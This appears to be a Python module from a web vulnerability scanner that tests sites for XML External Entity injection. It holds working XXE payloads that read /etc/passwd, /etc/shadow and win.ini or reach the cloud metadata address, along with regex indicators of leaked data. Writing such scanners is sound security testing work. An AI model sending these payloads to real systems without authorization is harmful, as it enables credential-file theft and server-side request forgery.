"""XML External Entity (XXE) injection detection."""

import re
import logging

from web_scanner.scanner import BaseScanner

logger = logging.getLogger(__name__)

XXE_PAYLOADS = [
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "file_read_unix",
        "file:///etc/passwd",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
        "shadow_read",
        "file:///etc/shadow",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "file_read_windows",
        "file:///c:/windows/win.ini",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "ssrf_metadata",
        "169.254.169.254",
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:80/">]><root>&xxe;</root>',
        "internal_localhost",
        "localhost:80",
    ),
]

XXE_INDICATORS = [
    r"root:x:0:",
    r"nobody:x:",
    r"\[boot loader\]",
    r"for 16-bit app support",
    r"public-ip",
    r"ami-id",
    r"instance-id",
    r"<!DOCTYPE.*SYSTEM",
    r"XML.*Error.*Entity",
    r"XXE",
]


class XXEScanner(BaseScanner):
    """Detect XXE by injecting malicious XML payloads into POST requests."""

    def run(self):
        findings: list[dict] = []

        endpoints = self._find_xml_endpoints()
        endpoints = endpoints if endpoints else ["/"]

        for endpoint in endpoints:
            for xml, ptype, indicator in XXE_PAYLOADS:
                resp = self.client.post(
                    endpoint,
                    data=xml.encode("utf-8"),
                    headers={"Content-Type": "application/xml"}
                )
                if resp is None:
                    continue

                for pattern in XXE_INDICATORS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        findings.append({
                            "severity": "CRITICAL",
                            "title": f"XXE vulnerability ({ptype}) at {endpoint}",
                            "detail": f"Sensitive data detected in response for payload: {ptype}",
                        })
                        break

                # Also flag if server returns the entity value
                if indicator in resp.text and indicator not in xml:
                    findings.append({
                        "severity": "CRITICAL",
                        "title": f"XXE data exfiltration ({ptype}) at {endpoint}",
                        "detail": f"File/system data visible in response: {indicator}",
                    })

        return findings

    def _find_xml_endpoints(self) -> list[str]:
        """Look for URLs that likely accept XML (APIs, SOAP, etc)."""
        resp = self.client.get("/")
        if resp is None:
            return []

        endpoints = []
        try:
            from bs4 import BeautifulSoup
            from urllib.parse import urlparse
            soup = BeautifulSoup(resp.text, "html.parser")
            for tag in soup.find_all(True, href=True):
                href = tag["href"]
                if any(kw in href.lower() for kw in ("api", "xml", "soap", "rpc", "import", "upload")):
                    endpoints.append(href)
        except Exception:
            pass
        return list(set(endpoints))
